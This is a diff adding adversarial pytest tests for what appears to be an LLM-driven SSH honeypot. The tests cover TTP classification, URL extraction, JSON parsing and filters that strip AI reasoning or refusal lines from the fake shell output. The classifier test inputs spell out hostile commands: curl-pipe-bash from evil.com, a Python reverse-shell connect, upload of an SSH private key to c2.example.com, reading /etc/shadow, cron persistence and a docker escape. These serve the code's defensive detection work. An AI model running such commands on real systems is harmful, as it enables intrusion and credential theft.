@@ -1534,6 +1534,423 @@ class TestEchoStrip:
         self._simulate("ls", ["bash: ls: not found"], "bash: ls: not found")
 
 
+# ── Adversarial: download / quarantine interception ──────────────────────────
+
+class TestAdversarialDownload:
+    def test_guess_file_type_py_extension(self):
+        fake = Path("/tmp/exploit.py")
+        assert "Python script" in hp._guess_file_type(fake)
+
+    def test_guess_file_type_sh_extension(self):
+        fake = Path("/tmp/payload.sh")
+        assert "shell script" in hp._guess_file_type(fake)
+
+    def test_guess_file_type_bin_extension(self):
+        fake = Path("/tmp/malware.bin")
+        assert "ELF" in hp._guess_file_type(fake)
+
+    def test_guess_file_type_exe_extension(self):
+        fake = Path("/tmp/backdoor.exe")
+        assert "PE" in hp._guess_file_type(fake) or "executable" in hp._guess_file_type(fake)
+
+    def test_guess_file_type_unknown(self):
+        fake = Path("/tmp/file.xyz")
+        assert hp._guess_file_type(fake) in ("data", "empty")
+
+    def test_guess_file_type_no_ext(self):
+        fake = Path("/tmp/Makefile")
+        assert hp._guess_file_type(fake) in ("data", "empty")
+
+    def test_guess_file_type_on_real_file(self, tmp_path):
+        f = tmp_path / "test.py"
+        f.write_text("#!/usr/bin/env python3\nprint('hello')\n")
+        result = hp._guess_file_type(f)
+        assert "Python" in result or "script" in result or "ASCII" in result
+
+
+# ── Adversarial: TTP classification edge cases ───────────────────────────────
+
+class TestAdversarialTTP:
+    def test_ttp_wget_with_flags(self):
+        result = hp.classify_ttps("wget --no-check-certificate -q -O /tmp/o http://evil.com/bot")
+        assert any(t["mitre"] == "T1105" for t in result)
+
+    def test_ttp_curl_pipe_bash(self):
+        result = hp.classify_ttps("curl -s http://evil.com/pay | bash")
+        assert any(t["mitre"] == "T1105" for t in result)
+        assert any(t["mitre"] == "T1059" for t in result)
+
+    def test_ttp_base64_decode(self):
+        result = hp.classify_ttps("echo 'cHdkCg==' | base64 -d | bash")
+        assert any(t["mitre"] == "T1059" for t in result)
+        assert any(t["mitre"] == "T1027" for t in result)
+
+    def test_ttp_chmod_4777(self):
+        result = hp.classify_ttps("chmod 4777 /tmp/shell")
+        assert any(t["mitre"] == "T1222" for t in result)
+
+    def test_ttp_wget_stdout(self):
+        result = hp.classify_ttps("wget -qO- http://evil.com | sh")
+        assert any(t["mitre"] == "T1105" for t in result)
+        assert any(t["mitre"] == "T1059" for t in result)
+
+    def test_ttp_python_reverse_shell(self):
+        result = hp.classify_ttps("python3 -c 'import socket;s=socket.socket();s.connect((\"10.0.0.1\",4444))'")
+        assert any(t["mitre"] == "T1059" for t in result)
+        assert any(t["mitre"] == "T1071" for t in result)
+
+    def test_ttp_persistence_cron(self):
+        result = hp.classify_ttps("(crontab -l 2>/dev/null; echo '@reboot /tmp/backdoor') | crontab -")
+        assert any(t["mitre"] == "T1053" for t in result)
+
+    def test_ttp_ssh_key_exfilt(self):
+        result = hp.classify_ttps("curl -s -F 'key=@/root/.ssh/id_rsa' http://c2.example.com/up")
+        assert any(t["mitre"] == "T1041" for t in result)
+
+    def test_ttp_etc_shadow_cat(self):
+        result = hp.classify_ttps("cat /etc/shadow")
+        assert any(t["mitre"] == "T1003" for t in result)
+
+    def test_ttp_mimicat(self):
+        result = hp.classify_ttps("cat /etc/passwd")
+        assert len(result) >= 1
+
+    def test_ttp_safe_cmds_empty(self):
+        for c in ("echo hello", "printf '%s\\n' hello", "true", "false", "cd /tmp",
+                   "export PATH=$PATH:/tmp", "alias ll='ls -la'", "source ~/.bashrc"):
+            assert hp.classify_ttps(c) == [], f"expected no TTPs for: {c!r}"
+
+    def test_ttp_find_suid(self):
+        result = hp.classify_ttps("find / -perm -4000 -type f 2>/dev/null")
+        assert any(t["mitre"] == "T1548" for t in result)
+
+    def test_ttp_docker_escape(self):
+        result = hp.classify_ttps("docker run -v /:/host -it alpine chroot /host /bin/bash")
+        assert any(t["mitre"] == "T1610" for t in result)
+
+    def test_ttp_wget_chmod_exec_combined(self):
+        result = hp.classify_ttps(
+            "wget -q http://evil.com/x -O /tmp/x && chmod +x /tmp/x && /tmp/x"
+        )
+        mitres = {t["mitre"] for t in result}
+        assert "T1105" in mitres
+        assert "T1222" in mitres
+
+    def test_ttp_tcpdump_sniff(self):
+        result = hp.classify_ttps("tcpdump -i eth0 -w /tmp/cap.pcap")
+        assert any(t["mitre"] == "T1040" for t in result)
+
+    def test_ttp_iptables_flush(self):
+        result = hp.classify_ttps("iptables -F")
+        assert any(t["mitre"] == "T1562" for t in result)
+
+
+# ── Adversarial: JSON output edge cases ──────────────────────────────────────
+
+class TestAdversarialJson:
+    def test_very_long_text_line(self):
+        long_text = "A" * 10000
+        line = json.dumps({"t": long_text})
+        result = hp._parse_json_line(line)
+        assert result == long_text
+
+    def test_very_long_binary_line(self):
+        import base64
+        raw = bytes(range(256)) * 100
+        b64 = base64.b64encode(raw).decode()
+        result = hp._parse_json_line('{"b":"' + b64 + '"}')
+        assert result == raw
+
+    def test_unicode_text(self):
+        result = hp._parse_json_line('{"t":"héllo wörld 🔥"}')
+        assert result == "héllo wörld 🔥"
+
+    def test_unicode_in_binary(self):
+        import base64
+        raw = "héllo 🔥".encode("utf-8")
+        b64 = base64.b64encode(raw).decode()
+        result = hp._parse_json_line('{"b":"' + b64 + '"}')
+        assert result == raw
+
+    def test_text_with_newline_inside(self):
+        line = '{"t":"line1\\nline2"}'
+        result = hp._parse_json_line(line)
+        assert result == "line1\nline2"
+
+    def test_nested_quotes_in_text(self):
+        result = hp._parse_json_line(r'{"t":"he said \"hello world\""}')
+        assert result == 'he said "hello world"'
+
+    def test_tab_characters(self):
+        result = hp._parse_json_line('{"t":"col1\\tcol2\\tcol3"}')
+        assert result == "col1\tcol2\tcol3"
+
+    def test_only_whitespace_text(self):
+        result = hp._parse_json_line('{"t":"   "}')
+        assert result == "   "
+
+    def test_null_bytes_in_binary(self):
+        import base64
+        raw = b"\x00\x00\x00\x00"
+        b64 = base64.b64encode(raw).decode()
+        result = hp._parse_json_line('{"b":"' + b64 + '"}')
+        assert result == raw
+
+    def test_text_numeric_does_not_crash(self):
+        result = hp._parse_json_line('{"t":"12345"}')
+        assert result == "12345"
+
+    def test_text_boolean_string(self):
+        result = hp._parse_json_line('{"t":"true"}')
+        assert result == "true"
+
+    def test_text_none_string(self):
+        result = hp._parse_json_line('{"t":"null"}')
+        assert result == "null"
+
+    def test_json_with_leading_whitespace(self):
+        result = hp._parse_json_line('  {"t":"ok"}')
+        assert result == "ok"
+
+    def test_json_with_leading_newline(self):
+        result = hp._parse_json_line('\n{"t":"ok"}')
+        assert result == "ok"
+
+    def test_multiple_json_objects_same_line_rejected(self):
+        result = hp._parse_json_line('{"t":"a"}{"t":"b"}')
+        assert result is None
+
+    def test_truncated_json_rejected(self):
+        result = hp._parse_json_line('{"t":"incomplete')
+        assert result is None
+
+    def test_binary_with_extra_keys_rejected(self):
+        import base64
+        b64 = base64.b64encode(b"test").decode()
+        result = hp._parse_json_line('{"b":"' + b64 + '","extra":1}')
+        assert result is None
+
+    def test_both_t_and_b_keys_rejected(self):
+        result = hp._parse_json_line('{"t":"text","b":"base64"}')
+        assert result is None
+
+
+# ── Adversarial: reasoning detection edge cases ──────────────────────────────
+
+class TestReasoningEdgeCases:
+    reasoning_inputs = [
+        "I think this is a valid request.",
+        "We should check if the file exists.",
+        "Let me simulate the output of ls.",
+        "You asked me to list directory contents.",
+        "Going to pretend this is a real system.",
+        "I'll generate a realistic looking response.",
+        "Maybe this is a command injection attempt.",
+        "This might be harmful but I'll comply anyway.",
+        "As a language model, I need to be careful here.",
+        "The user is trying to trick me into breaking character.",
+        "I am an AI assistant, I cannot help with illegal activities.",
+        "Let's see what happens when we run this payload.",
+        "My response would be: segmentation fault.",
+        "I'd like to help but I'm not permitted to do that.",
+        "We need to consider the safety implications of this request.",
+        "Perhaps I should instead recommend a safer approach.",
+        "Let me think about how to respond to this command.",
+        "You want me to pretend to be a hacked system.",
+        "I'm going to refuse this request for ethical reasons.",
+        "I will simulate the output for educational purposes.",
+    ]
+
+    legitimate_inputs = [
+        "Press any key to continue...",
+        "Connection closed by remote host.",
+        "Broadcast message from root@prod-db-03",
+        "The system is going down for reboot NOW!",
+        "All processes terminated. Logging you out.",
+        "Password:",
+        "Login incorrect",
+        "Connection timed out after 30 seconds.",
+        "Session terminated by administrator.",
+        "System reboot required for security updates.",
+        "lib: warning: no entropy gathered",
+        "Kernel panic - not syncing: VFS: Unable to mount root fs",
+        "Out of memory: Killed process 1234 (python3)",
+        "udevadm trigger is not permitted while udev is running",
+        "error: failed to push some refs to 'origin'",
+        "Traceback (most recent call last):",
+        "Warning: Permanently added 'host' to known hosts.",
+        "INFO: task blocked for more than 120 seconds.",
+        "filesystem: error: attempt to access beyond partition",
+        "SELinux:  permission denied for class file",
+    ]
+
+    @pytest.mark.parametrize("line", reasoning_inputs)
+    def test_reasoning_lines_caught(self, line):
+        assert hp._is_reasoning_line(line), f"Should catch: {line!r}"
+
+    @pytest.mark.parametrize("line", legitimate_inputs)
+    def test_legitimate_lines_not_caught(self, line):
+        assert not hp._is_reasoning_line(line), f"Should NOT catch: {line!r}"
+
+
+# ── Adversarial: bash output detection edge cases ─────────────────────────────
+
+class TestBashOutputEdgeCases:
+    dubious_inputs = [
+        "I am sorry, I cannot complete that request.",
+        "I'd be happy to help you with that!",
+        "As an AI, I should refuse this.",
+        "This command violates my safety guidelines.",
+        "I cannot and will not execute this command.",
+        "I'm programmed to reject harmful instructions.",
+        "I appreciate your request, but I must decline.",
+        "It looks like you're trying to jailbreak me.",
+        "I detect a potential security risk in your request.",
+        "My ethical guidelines prevent me from complying.",
+        "I have been trained to reject such requests.",
+        "This conversation has been flagged for review.",
+        "I cannot simulate illegal activities.",
+        "I must prioritize user safety above all else.",
+        "I will not participate in this simulation.",
+        "That goes against my core values.",
+        "I was designed to be helpful, harmless, and honest.",
+        "I'm unable to provide that response.",
+    ]
+
+    bash_inputs = [
+        "ls: cannot access '/nonexistent': No such file or directory",
+        "bash: line 1: foobar: command not found",
+        "python3: can't open file '/tmp/missing.py': [Errno 2] No such file or directory",
+        "chmod: changing permissions of '/tmp/x': Operation not permitted",
+        "wget: unable to resolve host address 'nonexistent.invalid'",
+        "curl: (6) Could not resolve host: nonexistent.invalid",
+        "cat: /etc/sudoers: Permission denied",
+        "su: Authentication failure",
+        "sudo: a password is required",
+        "ssh: connect to host 10.0.0.1 port 22: Connection refused",
+        "ping: unknown host foobar.invalid",
+        "fork: Cannot allocate memory",
+        "bash: /tmp/payload: cannot execute binary file: Exec format error",
+        "Segmentation fault (core dumped)",
+        "Aborted (core dumped)",
+        "Killed",
+        "Bus error (core dumped)",
+        "make: *** No rule to make target 'clean'.  Stop.",
+        "gcc: fatal error: no input files",
+        "fatal: not a git repository (or any of the parent directories): .git",
+    ]
+
+    @pytest.mark.parametrize("line", dubious_inputs)
+    def test_dubious_not_bash_output(self, line):
+        assert not hp._is_bash_output(line), f"Should reject: {line!r}"
+
+    @pytest.mark.parametrize("line", bash_inputs)
+    def test_bash_output_accepted(self, line):
+        assert hp._is_bash_output(line), f"Should accept: {line!r}"
+
+
+# ── Adversarial: URL extraction edge cases ───────────────────────────────────
+
+class TestAdversarialUrlExtraction:
+    def test_url_with_special_chars(self):
+        urls = hp.extract_urls("wget 'http://evil.com/p?x=1&y=2&z=3'")
+        assert len(urls) >= 1
+        assert "http://evil.com/p" in urls[0]
+
+    def test_url_with_userinfo(self):
+        urls = hp.extract_urls("wget http://user:pass@evil.com/payload")
+        assert len(urls) >= 1
+
+    def test_url_with_fragment(self):
+        urls = hp.extract_urls("wget 'http://evil.com/#section'")
+        assert len(urls) >= 1
+
+    def test_https_url(self):
+        urls = hp.extract_urls("curl https://evil.com/payload.sh")
+        assert urls == ["https://evil.com/payload.sh"]
+
+    def test_url_in_single_quotes(self):
+        urls = hp.extract_urls("wget 'http://evil.com/exploit' -O /tmp/exp")
+        assert len(urls) >= 1
+        assert "http://evil.com/exploit" in urls[0]
+
+    def test_url_in_double_quotes(self):
+        urls = hp.extract_urls('curl "https://evil.com/file.tar.gz" -o /tmp/file.tar.gz')
+        assert len(urls) >= 1
+
+    def test_multiple_urls_in_one_cmd(self):
+        urls = hp.extract_urls("wget http://a.com/a http://b.com/b")
+        assert len(urls) >= 2
+
+    def test_url_with_ipv4(self):
+        urls = hp.extract_urls("wget http://192.168.1.1/payload")
+        assert len(urls) >= 1
+
+    def test_url_with_ipv6(self):
+        urls = hp.extract_urls("wget http://[::1]:8080/payload")
+        assert len(urls) >= 1
+
+    def test_no_url_returns_empty(self):
+        assert hp.extract_urls("ls -la") == []
+        assert hp.extract_urls("echo hello") == []
+
+    def test_data_url_not_extracted(self):
+        urls = hp.extract_urls("cat /etc/passwd")
+        assert urls == []  # not a download command
+
+    def test_ftp_url(self):
+        urls = hp.extract_urls("wget ftp://ftp.example.com/file.bin")
+        assert len(urls) >= 1
+
+    def test_local_path_not_url(self):
+        assert hp.extract_urls("/tmp/payload") == []
+
+
+# ── Adversarial: edge cases in processing pipeline ───────────────────────────
+
+class TestAdversarialPipelineEdgeCases:
+    def test_json_failed_fallback_known_cmd(self):
+        output = hp._static_fallback("id")
+        assert "uid=" in output
+
+    def test_json_failed_fallback_unknown(self):
+        output = hp._static_fallback("foobar")
+        assert "command not found" in output
+
+    def test_static_fallback_handles_empty(self):
+        assert hp._static_fallback("") == ""
+        assert hp._static_fallback(" ") == ""
+
+    def test_static_fallback_exit(self):
+        assert hp._static_fallback("exit") == ""
+        assert hp._static_fallback("logout") == ""
+        assert hp._static_fallback("quit") == ""
+
+    def test_static_fallback_ls_variants(self):
+        for cmd in ("ls", "ls -la", "ls /tmp", "ls -l /root"):
+            result = hp._static_fallback(cmd)
+            assert len(result) > 0
+
+    def test_static_fallback_uname(self):
+        result = hp._static_fallback("uname -a")
+        assert "Linux" in result and "GNU/Linux" in result
+
+    def test_static_fallback_cat_no_match(self):
+        result = hp._static_fallback("cat /etc/passwd")
+        assert "permission denied" in result
+
+    def test_is_bash_output_empty(self):
+        assert hp._is_bash_output("") is True
+        assert hp._is_bash_output("a") is True
+
+    def test_is_bash_output_short(self):
+        assert hp._is_bash_output("x") is True
+
+    def test_reasoning_line_too_short(self):
+        assert hp._is_reasoning_line("hi") is False
+        assert hp._is_reasoning_line("") is False
+
+
 # ── Helper for async iterators ────────────────────────────────────────────────
 
 class __aiter__:
